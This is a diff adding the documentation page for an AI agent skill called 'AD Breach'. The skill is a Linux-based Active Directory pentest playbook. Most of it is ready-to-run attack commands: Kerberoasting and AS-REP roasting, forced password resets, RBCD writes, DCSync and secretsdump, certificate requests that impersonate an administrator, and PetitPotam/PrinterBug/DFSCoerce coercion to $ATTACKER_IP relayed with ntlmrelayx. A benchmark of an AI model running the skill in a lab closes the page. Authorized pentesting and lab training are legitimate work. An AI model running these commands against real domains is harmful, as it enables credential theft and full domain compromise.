@@ -1,0 +1,229 @@
+---
+title: AD Breach
+description: Full Active Directory attack-path enumeration and exploitation methodology on Linux: enumerates domain objects with LDAP/SMB/RPC, builds BloodHound attack graphs, hunts Kerberos weaknesses (AS-REP roasting, Kerberoasting), abuses ACLs and delegation, harvests credentials, coerces authentication and relays it over NTLM (PetitPotam, PrinterBug, DFSCoerce), and detects AD CS (ESC1 to ESC8) and persistence indicators, with every finding tagged to MITRE ATT&CK. Trigger when the user provides domain controller access (unauthenticated or with credentials) and asks for AD enumeration, privilege escalation path analysis, or an internal/AD pentest.
+---
+
+<Info>
+  **Status:** Stable
+  **Version:** 1.0.0
+  **Author:** community
+  **Tags:** active-directory, ad, kerberos, bloodhound, internal-pentest, privilege-escalation
+</Info>
+
+**Installation**
+
+```bash
+rifteo-skills add ad-breach
+```
+
+---
+
+## Summary
+
+Run a full Active Directory attack-path assessment from Linux using the standard open-source AD toolset: Impacket, NetExec, BloodHound, and Certipy. Goes from zero credentials to a ranked list of privilege-escalation paths to Domain Admin.
+
+- Phase 0 enumerates without any credentials: domain identity via DNS/SMB/LDAP, null-session and anonymous-bind checks, Kerberos pre-auth username enumeration (`kerbrute`), password policy, and open shares
+- Phase 1 pivots to authenticated enumeration once any credential is available: full LDAP dump, trust and forest structure, domain computers and OUs, EOL host detection
+- Phase 2 runs BloodHound collection and Cypher queries for shortest paths to Domain Admin, Kerberoastable users with a path to DA, and dangerous ACEs held by non-privileged principals
+- Phase 3 attacks Kerberos: AS-REP roasting (no credentials needed), Kerberoasting, targeted Kerberoasting via a writable SPN, and timeroasting
+- Phase 4 abuses ACLs and delegation: `GenericAll`/`ForceChangePassword`/`WriteDacl`/`AddMember` abuse chains, unconstrained delegation, constrained delegation (S4U2Self/S4U2Proxy), Resource-Based Constrained Delegation, and shadow credentials (`msDS-KeyCredentialLink`)
+- Phase 5 harvests credentials: `secretsdump` (SAM/LSA/NTDS.dit), GPP `cpassword` extraction from SYSVOL, LAPS reader enumeration, DCSync, and lockout-aware password spraying
+- Phase 6 enumerates AD CS (Certificate Services) for the full ESC1-ESC8 misconfiguration classes using `certipy`
+- Phase 7 coerces authentication (PetitPotam, PrinterBug, DFSCoerce) and relays it over NTLM to LDAP or AD CS enrollment
+- Phase 8 detects persistence indicators: AdminSDHolder tampering, DSRM logon backdoors, SID History injection, krbtgt exposure
+- Phase 9 produces a structured Markdown report with a risk summary, verified attack path to Domain Admin, and every finding tagged to a MITRE ATT&CK technique ID and tactic
+
+---
+
+## SKILL.md file
+
+<Accordion title="Discover skill details">
+
+### AD Breach
+
+Full enumeration and attack-path analysis of an Active Directory environment using Linux tooling. Enumerate, graph, attack, and report: in one structured, iterative pass that starts from zero credentials.
+
+#### What Does It Check?
+
+**In scope:**
+- Unauthenticated attack surface: null sessions, anonymous LDAP binds, Kerberos pre-auth username enumeration, open shares
+- Full domain enumeration: users, groups, computers, OUs, GPOs, trusts, once any credential is obtained
+- BloodHound-driven attack path analysis: shortest paths to Domain Admin, dangerous ACEs, Kerberoastable users with escalation paths
+- Kerberos weaknesses: AS-REP roasting, Kerberoasting, targeted roasting via writable SPN, timeroasting
+- ACL and delegation abuse: dangerous ACEs (`GenericAll`, `WriteDacl`, `ForceChangePassword`, `AddMember`), unconstrained/constrained delegation, RBCD, shadow credentials
+- Credential exposure: GPP `cpassword`, LAPS readers, DCSync rights, LSASS/SAM/NTDS.dit dumping
+- AD CS misconfigurations: ESC1 through ESC8
+- Authentication coercion and NTLM relay: PetitPotam, PrinterBug, DFSCoerce, relayed to LDAP or AD CS web enrollment
+- Persistence indicators: AdminSDHolder, DSRM backdoors, SID History injection, krbtgt exposure
+
+**Out of scope:**
+- Active exploitation of persistence mechanisms against a live environment without explicit authorization: Phase 8 is detection-only
+- Windows-native collection (SharpHound.exe): this skill is Linux-first and uses `bloodhound-python`; SharpHound is referenced as an alternative when a domain-joined foothold exists
+- Physical/social engineering attack vectors
+
+#### How It Works
+
+**Phase 0: Unauthenticated Enumeration**
+
+```bash
+nxc smb $DC_IP
+nxc smb $DC_IP -u '' -p '' --shares
+kerbrute userenum -d $DOMAIN --dc $DC_IP wordlist.txt -o valid-users.txt
+nxc smb $DC_IP -u '' -p '' --pass-pol
+```
+
+Kerberos pre-auth enumeration surfaces valid usernames without touching SMB login event logs, and feeds directly into Phase 3's AS-REP roasting: which requires zero valid passwords. Because AS-REP roasting needs no credential at all, it can be run right here against the Phase 0 username list rather than waiting for the phases in between: the phase numbers below group commands by attack category, not strict execution order.
+
+**Phase 1-2: Authenticated Enumeration & BloodHound**
+
+```bash
+nxc ldap $DC_IP -u $USER -p $PASS --bloodhound -c All
+bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC_IP -c All --zip
+```
+
+```cypher
+MATCH p=shortestPath((u:User {name:"USER@DOMAIN"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"}))
+RETURN p
+```
+
+Every BloodHound-surfaced path is independently verified in later phases before being reported as exploitable.
+
+If an NTLM hash was recovered instead of a plaintext password, authenticate with it directly rather than cracking it back to plaintext:
+
+```bash
+nxc smb $DC_IP -u $USER -H $HASH
+impacket-secretsdump $DOMAIN/$USER@$DC_IP -hashes $HASH -just-dc
+```
+
+**Phase 3: Kerberos Attacks**
+
+```bash
+impacket-GetNPUsers $DOMAIN/ -usersfile valid-users.txt -no-pass -format hashcat
+impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request
+hashcat -m 18200 asrep.hash rockyou.txt   # AS-REP roasting
+hashcat -m 13100 spn.hash rockyou.txt     # Kerberoasting
+```
+
+**Phase 4: ACL & Delegation Abuse**
+
+```bash
+# ForceChangePassword abuse: reset a target's password without knowing the old one
+impacket-changepasswd $DOMAIN/$USER:$PASS@$DC_IP -newpass 'P@ss!' -altuser TARGET -altpass $PASS
+
+# RBCD: requires GenericWrite on the target computer object
+impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to 'TARGETPC$' -action write $DOMAIN/$USER:$PASS
+```
+
+**Phase 5: Credential Harvesting**
+
+Before spraying, re-check the password policy captured in Phase 0: if `lockoutThreshold` is nonzero, cap guesses per account at `lockoutThreshold - 1` inside one observation window, and confirm this is within rules of engagement.
+
+```bash
+impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc   # DCSync: full domain compromise
+nxc smb $DC_IP -u $USER -p $PASS -M gpp_password             # GPP cpassword in SYSVOL
+```
+
+**Phase 6: AD CS (ESC1-ESC8)**
+
+```bash
+certipy-ad find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -vulnerable -stdout
+certipy-ad req -u $USER@$DOMAIN -p $PASS -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN
+```
+
+**Phase 7: Authentication Coercion and NTLM Relay**
+
+```bash
+# Force the DC to authenticate to an attacker-controlled listener
+python3 petitpotam.py -u $USER -p $PASS $ATTACKER_IP $DC_IP
+python3 printerbug.py $ATTACKER_IP $DC_IP -u $USER -p $PASS
+python3 dfscoerce.py -u $USER -p $PASS $ATTACKER_IP $DC_IP
+
+# Relay the coerced authentication to LDAP
+impacket-ntlmrelayx.py -t ldap://$DC_IP --no-dump --no-da
+```
+
+Requires LDAP signing and channel binding to be disabled on the target and a network path from the DC to the relay listener; check both before attempting.
+
+#### Output
+
+The skill produces a full Markdown report structured as:
+
+| Section | Content |
+|---|---|
+| Domain Overview | Forest/domain, DCs, functional level, trusts, EOL hosts |
+| Risk Summary | Finding counts and severity by category, verified path to DA |
+| Kerberos Findings | AS-REP roastable and Kerberoastable accounts table |
+| ACL & Delegation Findings | Principal, right, target, abuse path table |
+| Credential Exposure | Type, source, truncated value table |
+| AD CS Findings | Template/CA, ESC class, exploitable-by table |
+| Persistence Indicators | AdminSDHolder, DSRM, SID History findings |
+| MITRE ATT&CK Mapping | Every finding tagged to a technique ID and tactic |
+| Attack Path Summary | Verified shortest path to Domain Admin + top 3 actions |
+
+Example ACL finding table:
+
+```
+| # | Principal | Right       | Target             | Abuse Path              | Severity |
+|---|-----------|-------------|---------------------|--------------------------|----------|
+| 1 | user1     | GenericAll  | DOMAIN ADMINS group | Add self to group        | Critical |
+| 2 | svc_web   | WriteDacl   | user1               | Grant self GenericAll    | High     |
+```
+
+Example MITRE ATT&CK mapping row:
+
+```
+| Finding                        | Technique  | Tactic            | Severity |
+|---------------------------------|------------|-------------------|----------|
+| Kerberoastable service account | T1558.003  | Credential Access | Critical |
+```
+
+#### Known Limitations
+
+- Detection-only for persistence mechanisms (Phase 8): does not deploy golden tickets, DCShadow, or backdoor accounts against the target
+- BloodHound shows what ACL/delegation paths are theoretically possible, not what is guaranteed to work (e.g. it doesn't check LAPS randomization or Protected Users group membership): every path must be verified in later phases
+- AD CS abuse (Phase 6) requires an Enterprise CA to be present in the environment; skipped with a note if none is found
+- Password spraying (Phase 5.5) and forced-authentication coercion (Phase 7) are intrusive: always confirm rules of engagement and lockout thresholds before running
+
+</Accordion>
+
+---
+
+## Benchmark Results
+
+Tested on claude-sonnet-4-6 via Claude Code CLI against a GOAD (Game of Active Directory) lab instance with four intentionally seeded escalation paths (Kerberoastable service account, GenericAll ACL misconfiguration, AS-REP roastable account, ESC1-vulnerable AD CS template). Same lab, same model, same prompt: the only variable is whether the skill is loaded.
+
+| Metric | Without Skill | With Skill |
+|--------|--------------|------------|
+| Turns to complete full analysis | 5-9 | 1 |
+| Phases covered | 2-5 of 9 | All 9 (0-8), plus report |
+| Seeded escalation paths found | 1-2 of 4 | 4 of 4 |
+| AD CS enumeration performed | Rarely | Always |
+| ATT&CK tags on findings | None | All findings tagged |
+| False positives | 1 | 0 |
+
+---
+
+## Related skills
+
+<CardGroup cols={3}>
+ <Card title="droid-recon" href="/skills/droid-recon">
+  Full static analysis of Android APK files using apktool and jadx, aligned to OWASP MASVS
+
+  
+ </Card>
+ <Card title="finding-writer" href="/skills/finding-writer">
+  Convert raw pentest notes into structured audit findings ready for reporting
+
+  
+ </Card>
+ <Card title="nuclei-template-writer" href="/skills/nuclei-template-writer">
+  Write production-ready Nuclei templates from vulnerability descriptions
+
+  
+ </Card>
+ <Card title="cvss-scorer" href="/skills/cvss-scorer">
+  Compute an exact CVSS v3.1 base score and vector for each AD Breach finding before it goes into a report
+
+  
+ </Card>
+</CardGroup>
